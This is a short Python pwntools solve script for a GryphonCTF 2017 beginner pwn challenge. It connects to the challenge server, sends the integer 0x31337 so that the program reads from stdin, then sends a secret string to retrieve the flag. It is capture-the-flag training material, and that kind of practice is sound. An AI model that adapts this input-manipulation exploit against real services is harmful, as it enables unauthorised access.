#! /usr/bin/env python3
##
# Created for GryphonCTF 2017_NoobPwn
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
# Imports
from pwn import *

# Logging
with log.progress("Cracking Tic-Tac-Toe...") as p:
    # Create tube
    t = remote("pwn2.chal.gryphonctf.com", 17346)

    # Send key to make fd = 0/STDIN
    t.recvuntil("Key? ")
    t.sendline(str(int(0x31337)))

    # Send secret to STDIN
    t.sendline("GIMMEDAFLAG")

    # Get flag
    flag = t.recvline().decode()
    p.success(flag)
